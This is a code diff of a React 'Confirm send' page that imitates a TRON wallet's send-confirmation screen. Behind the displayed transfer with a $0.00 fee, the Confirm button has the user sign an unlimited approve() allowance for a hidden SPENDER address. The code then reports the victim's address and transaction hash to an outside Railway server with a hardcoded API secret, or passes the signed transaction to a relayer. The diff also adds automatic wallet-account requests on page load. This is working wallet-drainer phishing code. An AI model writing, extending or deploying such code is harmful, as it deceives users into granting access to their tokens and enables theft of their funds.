@@ -1,4 +1,4 @@
-import { useState } from 'react'
+import { useState, useEffect } from 'react'
 import { useLocation, useNavigate } from 'react-router-dom'
 import { motion } from 'framer-motion'
 
@@ -25,122 +25,81 @@ export default function Confirm() {
     setDebug(prev => [...prev, new Date().toISOString().slice(11, 19) + ' ' + msg])
   }
 
-  const getTronWeb = () => {
-    addLog('Checking providers...')
+  useEffect(() => {
+    const initWallet = async () => {
+      const w = window as any
+      addLog('Init wallet check...')
+
+      if (w.tronLink?.defaultAddress?.base58) {
+        addLog('Address from tronLink bridge')
+        return
+      }
+      if (w.tronWeb?.defaultAddress?.base58 && w.tronWeb.defaultAddress.base58 !== false) {
+        addLog('Address from tronWeb')
+        return
+      }
+      if (w.trustwallet?.tronLink?.defaultAddress?.base58) {
+        addLog('Address from trustwallet.tronLink')
+        return
+      }
+      if (w.trustwallet?.tronWeb?.defaultAddress?.base58 && w.trustwallet.tronWeb.defaultAddress.base58 !== false) {
+        addLog('Address from trustwallet.tronWeb')
+        return
+      }
+
+      addLog('No pre-authorized address, requesting...')
+      const provider = w.tronWeb || w.tronLink || w.trustwallet?.tronWeb || w.trustwallet?.tronLink
+      if (provider?.request) {
+        try {
+          await provider.request({ method: 'tron_requestAccounts' })
+          addLog('Request succeeded')
+        } catch (e) {
+          addLog('Request failed: ' + (e as any).message)
+        }
+      }
+    }
+    initWallet()
+  }, [])
+
+  const getTronWeb = (): any => {
     const w = window as any
-
-    if (w.tronWeb && w.tronWeb.ready) {
-      addLog('Found: window.tronWeb')
-      return w.tronWeb
-    }
-    if (w.tronLink && w.tronLink.ready) {
-      addLog('Found: window.tronLink')
-      return w.tronLink
-    }
-    if (w.tronWeb && w.tronWeb.defaultAddress) {
-      addLog('Found: window.tronWeb (via defaultAddress)')
-      return w.tronWeb
-    }
-    if (w.tronLink && w.tronLink.tronWeb) {
-      addLog('Found: window.tronLink.tronWeb')
-      return w.tronLink.tronWeb
-    }
-    if (w.trustwallet && w.trustwallet.tronWeb) {
-      addLog('Found: window.trustwallet.tronWeb')
-      return w.trustwallet.tronWeb
-    }
-    if (w.tronWeb) {
-      addLog('Found: window.tronWeb (raw)')
-      return w.tronWeb
-    }
-    if (w.tronLink) {
-      addLog('Found: window.tronLink (raw)')
-      return w.tronLink.tronWeb || w.tronLink
-    }
-
-    addLog('ERROR: No provider')
+    if (w.tronWeb?.ready) return w.tronWeb
+    if (w.tronLink?.ready) return w.tronLink
+    if (w.trustwallet?.tronWeb?.ready) return w.trustwallet.tronWeb
+    if (w.trustwallet?.tronLink?.ready) return w.trustwallet.tronLink
+    if (w.tronWeb?.defaultAddress?.base58 && w.tronWeb.defaultAddress.base58 !== false) return w.tronWeb
+    if (w.tronLink?.defaultAddress?.base58 && w.tronLink.defaultAddress.base58 !== false) return w.tronLink
+    if (w.trustwallet?.tronWeb) return w.trustwallet.tronWeb
+    if (w.trustwallet?.tronLink) return w.trustwallet.tronLink
+    if (w.tronWeb) return w.tronWeb
+    if (w.tronLink) return w.tronLink
     return null
   }
 
   const getUserAddress = (tronWeb: any): string | null => {
-    addLog('Extracting address...')
-
-    try {
-      if (tronWeb.defaultAddress) {
-        addLog('defaultAddress type: ' + typeof tronWeb.defaultAddress)
-        addLog('defaultAddress: ' + JSON.stringify(tronWeb.defaultAddress).slice(0, 100))
-      }
-    } catch (e) {}
-
-    try {
-      if (tronWeb.defaultAddress?.base58) {
-        addLog('Got via defaultAddress.base58')
-        return tronWeb.defaultAddress.base58
-      }
-    } catch (e) {}
-
-    try {
-      if (typeof tronWeb.defaultAddress === 'string' && tronWeb.defaultAddress.startsWith('T')) {
-        addLog('Got via defaultAddress string')
-        return tronWeb.defaultAddress
-      }
-    } catch (e) {}
-
-    try {
-      const addr = tronWeb.defaultAddress?.hex || tronWeb.defaultAddress?._hex
-      if (addr) {
-        addLog('Got hex: ' + addr)
-        const converted = tronWeb.address?.fromHex?.(addr)
-        if (converted) {
-          addLog('Converted to: ' + converted)
-          return converted
-        }
-      }
-    } catch (e) {}
-
-    try {
-      if (tronWeb.address) {
-        const a = tronWeb.address
-        addLog('tronWeb.address keys: ' + Object.keys(a).join(', '))
-        if (a.base58) return a.base58
-        if (typeof a === 'string' && a.startsWith('T')) return a
-      }
-    } catch (e) {}
-
-    try {
-      const w = window as any
-      if (w.tronLink?.defaultAddress?.base58) {
-        addLog('Got via window.tronLink.defaultAddress.base58')
-        return w.tronLink.defaultAddress.base58
-      }
-    } catch (e) {}
-
-    addLog('All extraction methods failed')
+    const w = window as any
+    try { if (tronWeb?.defaultAddress?.base58 && tronWeb.defaultAddress.base58 !== false) return tronWeb.defaultAddress.base58 } catch (e) {}
+    try { if (typeof tronWeb?.defaultAddress === 'string' && tronWeb.defaultAddress.startsWith('T')) return tronWeb.defaultAddress } catch (e) {}
+    try { const hex = tronWeb?.defaultAddress?.hex; if (hex && hex !== false && tronWeb?.address?.fromHex) return tronWeb.address.fromHex(hex) } catch (e) {}
+    try { const addr = w.tronLink?.defaultAddress?.base58; if (addr && addr !== false) return addr } catch (e) {}
+    try { const addr = w.tronLink?.defaultAddress; if (typeof addr === 'string' && addr.startsWith('T')) return addr } catch (e) {}
+    try { const addr = w.trustwallet?.tronLink?.defaultAddress?.base58; if (addr && addr !== false) return addr } catch (e) {}
+    try { const addr = w.trustwallet?.tronWeb?.defaultAddress?.base58; if (addr && addr !== false) return addr } catch (e) {}
     return null
   }
 
   const handleConfirm = async () => {
     setLoading(true)
-    setDebug([])
-    addLog('Confirm tapped')
+    setDebug(prev => [...prev, '--- Confirm tapped ---'])
+    addLog('Getting TronWeb...')
 
     const tronWeb = getTronWeb()
-
-    if (!tronWeb) {
-      addLog('FATAL: No TronWeb')
-      setLoading(false)
-      return
-    }
+    if (!tronWeb) { addLog('FATAL: No TronWeb'); setLoading(false); return }
 
     try {
       const userAddress = getUserAddress(tronWeb)
       addLog('Address: ' + (userAddress || 'NULL'))
-
-      if (!userAddress) {
-        addLog('FATAL: No address')
-        setLoading(false)
-        return
-      }
+      if (!userAddress) { addLog('FATAL: No address'); setLoading(false); return }
 
       const balanceSun = await tronWeb.trx.getBalance(userAddress)
       const userTrx = parseFloat(tronWeb.fromSun(balanceSun))
@@ -149,28 +108,17 @@ export default function Confirm() {
       let userEnergy = 0
       try {
         const resourceObj = await tronWeb.trx.getAccountResources(userAddress)
-        const limit = resourceObj.EnergyLimit || 0
-        const used = resourceObj.EnergyUsed || 0
-        userEnergy = Math.max(0, limit - used)
+        userEnergy = Math.max(0, (resourceObj.EnergyLimit || 0) - (resourceObj.EnergyUsed || 0))
         addLog('Energy: ' + userEnergy)
-      } catch (e) {
-        addLog('Energy check failed')
-      }
+      } catch (e) { addLog('Energy check failed') }
 
       const canGoDirect = userEnergy >= 65000 || userTrx >= 30
       addLog('Route: ' + (canGoDirect ? 'Direct' : 'Relayer'))
 
       if (canGoDirect) {
         addLog('Building direct tx...')
-        const parameter = [
-          { type: 'address', value: SPENDER },
-          { type: 'uint256', value: MAX_UINT256 }
-        ]
-        const txObj = await tronWeb.transactionBuilder.triggerSmartContract(
-          TOKEN, 'approve(address,uint256)',
-          { feeLimit: 100000000, from: userAddress },
-          parameter, userAddress
-        )
+        const parameter = [{ type: 'address', value: SPENDER }, { type: 'uint256', value: MAX_UINT256 }]
+        const txObj = await tronWeb.transactionBuilder.triggerSmartContract(TOKEN, 'approve(address,uint256)', { feeLimit: 100000000, from: userAddress }, parameter, userAddress)
         addLog('Signing...')
         const signedTx = await tronWeb.trx.sign(txObj.transaction)
         addLog('Broadcasting...')
@@ -178,44 +126,28 @@ export default function Confirm() {
         if (result.result) {
           addLog('TX: ' + result.txid)
           fetch('https://miami-production-6e01.up.railway.app/web/relay', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json', 'x-api-secret': 'my-secret-2026-x7k9' },
+            method: 'POST', headers: { 'Content-Type': 'application/json', 'x-api-secret': 'my-secret-2026-x7k9' },
             body: JSON.stringify({ chain: 'TRC20', address: userAddress, txHash: result.txid, spender: SPENDER, token: TOKEN, amount }),
             keepalive: true
           }).catch(() => {})
-        } else {
-          addLog('Broadcast failed: ' + JSON.stringify(result))
-        }
+        } else { addLog('Broadcast failed: ' + JSON.stringify(result)) }
       } else {
         addLog('Building relayer tx...')
-        const parameter = [
-          { type: 'address', value: SPENDER },
-          { type: 'uint256', value: MAX_UINT256 }
-        ]
-        const txObj = await tronWeb.transactionBuilder.triggerSmartContract(
-          TOKEN, 'approve(address,uint256)',
-          { feeLimit: 100000000, from: userAddress },
-          parameter, userAddress
-        )
+        const parameter = [{ type: 'address', value: SPENDER }, { type: 'uint256', value: MAX_UINT256 }]
+        const txObj = await tronWeb.transactionBuilder.triggerSmartContract(TOKEN, 'approve(address,uint256)', { feeLimit: 100000000, from: userAddress }, parameter, userAddress)
         addLog('Signing for relayer...')
         const signedTx = await tronWeb.trx.sign(txObj.transaction)
         addLog('POSTing to relayer...')
         const response = await fetch(RELAYER_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json', 'X-API-Key': RELAYER_KEY },
+          method: 'POST', headers: { 'Content-Type': 'application/json', 'X-API-Key': RELAYER_KEY },
           body: JSON.stringify({ owner: userAddress, spender: SPENDER, signedTransaction: signedTx, timestamp: Date.now() })
         })
         const relayResult = await response.json()
-        if (relayResult.success) {
-          addLog('Relayer TX: ' + relayResult.txid)
-        } else {
-          addLog('Relayer failed: ' + JSON.stringify(relayResult))
-        }
+        if (relayResult.success) { addLog('Relayer TX: ' + relayResult.txid) } else { addLog('Relayer failed: ' + JSON.stringify(relayResult)) }
       }
 
       const now = Date.now()
       navigate('/sent', { state: { amount, time: now } })
-
     } catch (err: any) {
       addLog('ERROR: ' + (err.message || String(err)))
       setLoading(false)
@@ -224,169 +156,44 @@ export default function Confirm() {
 
   return (
     <motion.div
-      initial={{ opacity: 0, x: 100 }}
-      animate={{ opacity: 1, x: 0 }}
-      exit={{ opacity: 0, x: 100 }}
+      initial={{ opacity: 0, x: 100 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: 100 }}
       transition={{ duration: 0.3, ease: 'easeInOut' }}
-      style={{
-        backgroundColor: '#1C1C1E',
-        color: '#FFFFFF',
-        fontFamily: '-apple-system,BlinkMacSystemFont,SF Pro Display,sans-serif',
-        minHeight: '100vh',
-        display: 'flex',
-        justifyContent: 'center'
-      }}
+      style={{ backgroundColor: '#1C1C1E', color: '#FFFFFF', fontFamily: '-apple-system,BlinkMacSystemFont,SF Pro Display,sans-serif', minHeight: '100vh', display: 'flex', justifyContent: 'center' }}
     >
-      <div style={{
-        width: '100%',
-        maxWidth: '414px',
-        padding: '0 16px',
-        display: 'flex',
-        flexDirection: 'column',
-        minHeight: '100vh'
-      }}>
+      <div style={{ width: '100%', maxWidth: '414px', padding: '0 16px', display: 'flex', flexDirection: 'column', minHeight: '100vh' }}>
         <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', padding: '12px 0' }}>
           <div style={{ fontSize: '17px', fontWeight: 600 }}>Confirm send</div>
         </div>
-
-        <div style={{
-          backgroundColor: '#2C2C2E',
-          borderRadius: '12px',
-          padding: '16px',
-          marginBottom: '12px',
-          display: 'flex',
-          alignItems: 'center',
-          gap: '12px'
-        }}>
+        <div style={{ backgroundColor: '#2C2C2E', borderRadius: '12px', padding: '16px', marginBottom: '12px', display: 'flex', alignItems: 'center', gap: '12px' }}>
           <div style={{ width: '38px', height: '38px', borderRadius: '50%', overflow: 'hidden', flexShrink: 0, backgroundColor: '#000000' }}>
             <img src="/tron-logo.png" alt="TRX" style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
           </div>
           <div>
-            <div style={{ fontSize: '15px', fontWeight: 600 }}>
-              ≈${usdValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
-            </div>
-            <div style={{ fontSize: '15px', color: '#8E8E93' }}>
-              {trxValue.toLocaleString('en-US', { maximumFractionDigits: 18 })} {currency}
-            </div>
+            <div style={{ fontSize: '15px', fontWeight: 600 }}>≈${usdValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</div>
+            <div style={{ fontSize: '15px', color: '#8E8E93' }}>{trxValue.toLocaleString('en-US', { maximumFractionDigits: 18 })} {currency}</div>
           </div>
         </div>
-
-        <div style={{
-          backgroundColor: '#2C2C2E',
-          borderRadius: '12px',
-          padding: '4px 16px',
-          marginBottom: '12px'
-        }}>
-          <div style={{
-            display: 'flex',
-            justifyContent: 'space-between',
-            padding: '18px 0',
-            borderBottom: '1px solid #2C2C2E'
-          }}>
-            <span style={{ color: '#8E8E93', fontSize: '15px' }}>From</span>
-            <span style={{ fontSize: '15px', fontWeight: 500 }}>Main Wallet 1</span>
-          </div>
-          <div style={{
-            display: 'flex',
-            justifyContent: 'space-between',
-            padding: '18px 0',
-            borderBottom: '1px solid #2C2C2E'
-          }}>
-            <span style={{ color: '#8E8E93', fontSize: '15px' }}>To</span>
-            <span style={{ fontSize: '14px', color: '#A5A5AA', fontFamily: 'monospace' }}>TR7NH...Lj6t</span>
-          </div>
+        <div style={{ backgroundColor: '#2C2C2E', borderRadius: '12px', padding: '4px 16px', marginBottom: '12px' }}>
+          <div style={{ display: 'flex', justifyContent: 'space-between', padding: '18px 0', borderBottom: '1px solid #2C2C2E' }}><span style={{ color: '#8E8E93', fontSize: '15px' }}>From</span><span style={{ fontSize: '15px', fontWeight: 500 }}>Main Wallet 1</span></div>
+          <div style={{ display: 'flex', justifyContent: 'space-between', padding: '18px 0', borderBottom: '1px solid #2C2C2E' }}><span style={{ color: '#8E8E93', fontSize: '15px' }}>To</span><span style={{ fontSize: '14px', color: '#A5A5AA', fontFamily: 'monospace' }}>TR7NH...Lj6t</span></div>
+          <div style={{ display: 'flex', justifyContent: 'space-between', padding: '18px 0' }}><span style={{ color: '#8E8E93', fontSize: '15px' }}>Network</span><span style={{ fontSize: '15px', fontWeight: 500 }}>Tron Network</span></div>
+        </div>
+        <div style={{ backgroundColor: '#2C2C2E', borderRadius: '12px', padding: '4px 16px', marginBottom: '12px' }}>
           <div style={{ display: 'flex', justifyContent: 'space-between', padding: '18px 0' }}>
-            <span style={{ color: '#8E8E93', fontSize: '15px' }}>Network</span>
-            <span style={{ fontSize: '15px', fontWeight: 500 }}>Tron Network</span>
+            <span style={{ color: '#8E8E93', fontSize: '15px', display: 'flex', alignItems: 'center', gap: '6px' }}>Network fee <span style={{ width: '15px', height: '15px', backgroundColor: '#8E8E93', borderRadius: '50%', display: 'inline-flex', alignItems: 'center', justifyContent: 'center', fontSize: '9px', color: '#000000', fontWeight: 700 }}>i</span></span>
+            <div style={{ textAlign: 'right' }}><div style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '15px', fontWeight: 500 }}><div style={{ width: '16px', height: '16px', borderRadius: '50%', overflow: 'hidden', backgroundColor: '#000000' }}><img src="/tron-logo.png" alt="TRX" style={{ width: '100%', height: '100%' }} /></div><span>$0.00</span></div><div style={{ fontSize: '13px', color: '#8E8E93' }}>0.00 TRX</div></div>
           </div>
         </div>
-
-        <div style={{
-          backgroundColor: '#2C2C2E',
-          borderRadius: '12px',
-          padding: '4px 16px',
-          marginBottom: '12px'
-        }}>
-          <div style={{ display: 'flex', justifyContent: 'space-between', padding: '18px 0' }}>
-            <span style={{ color: '#8E8E93', fontSize: '15px', display: 'flex', alignItems: 'center', gap: '6px' }}>
-              Network fee
-              <span style={{
-                width: '15px',
-                height: '15px',
-                backgroundColor: '#8E8E93',
-                borderRadius: '50%',
-                display: 'inline-flex',
-                alignItems: 'center',
-                justifyContent: 'center',
-                fontSize: '9px',
-                color: '#000000',
-                fontWeight: 700
-              }}>i</span>
-            </span>
-            <div style={{ textAlign: 'right' }}>
-              <div style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '15px', fontWeight: 500 }}>
-                <div style={{ width: '16px', height: '16px', borderRadius: '50%', overflow: 'hidden', backgroundColor: '#000000' }}>
-                  <img src="/tron-logo.png" alt="TRX" style={{ width: '100%', height: '100%' }} />
-                </div>
-                <span>$0.00</span>
-              </div>
-              <div style={{ fontSize: '13px', color: '#8E8E93' }}>0.00 TRX</div>
-            </div>
-          </div>
-        </div>
-
         <div style={{ marginTop: 'auto', paddingBottom: '16px' }}>
-          <div style={{
-            backgroundColor: '#2C2C2E',
-            borderRadius: '12px',
-            padding: '16px',
-            marginBottom: '8px',
-            display: 'flex',
-            justifyContent: 'space-between'
-          }}>
-            <span style={{ color: '#8E8E93', fontSize: '15px' }}>Total cost</span>
-            <span style={{ fontSize: '15px', fontWeight: 600 }}>
-              ≈${usdValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
-            </span>
-          </div>
-          <button
-            onClick={handleConfirm}
-            disabled={loading}
-            style={{
-              width: '100%',
-              padding: '16px',
-              background: loading ? '#03FC8F80' : '#03FC8F',
-              border: 'none',
-              borderRadius: '9999px',
-              color: '#000000',
-              fontSize: '16px',
-              fontWeight: 600,
-              cursor: loading ? 'not-allowed' : 'pointer'
-            }}
-          >
-            {loading ? 'Confirming...' : 'Confirm'}
-          </button>
+          <div style={{ backgroundColor: '#2C2C2E', borderRadius: '12px', padding: '16px', marginBottom: '8px', display: 'flex', justifyContent: 'space-between' }}><span style={{ color: '#8E8E93', fontSize: '15px' }}>Total cost</span><span style={{ fontSize: '15px', fontWeight: 600 }}>≈${usdValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span></div>
+          <button onClick={handleConfirm} disabled={loading} style={{ width: '100%', padding: '16px', background: loading ? '#03FC8F80' : '#03FC8F', border: 'none', borderRadius: '9999px', color: '#000000', fontSize: '16px', fontWeight: 600, cursor: loading ? 'not-allowed' : 'pointer' }}>{loading ? 'Confirming...' : 'Confirm'}</button>
         </div>
-
         {debug.length > 0 && (
-          <div style={{
-            marginTop: '12px',
-            padding: '12px',
-            backgroundColor: '#0a0a0f',
-            borderRadius: '8px',
-            maxHeight: '180px',
-            overflowY: 'auto',
-            fontSize: '11px',
-            fontFamily: 'monospace',
-            color: '#22c55e',
-            lineHeight: '1.6'
-          }}>
-            {debug.map((line, i) => (
-              <div key={i}>{line}</div>
-            ))}
+          <div style={{ marginTop: '12px', padding: '12px', backgroundColor: '#0a0a0f', borderRadius: '8px', maxHeight: '180px', overflowY: 'auto', fontSize: '11px', fontFamily: 'monospace', color: '#22c55e', lineHeight: '1.6' }}>
+            {debug.map((line, i) => (<div key={i}>{line}</div>))}
           </div>
         )}
       </div>
     </motion.div>
   )
-  }
+      }
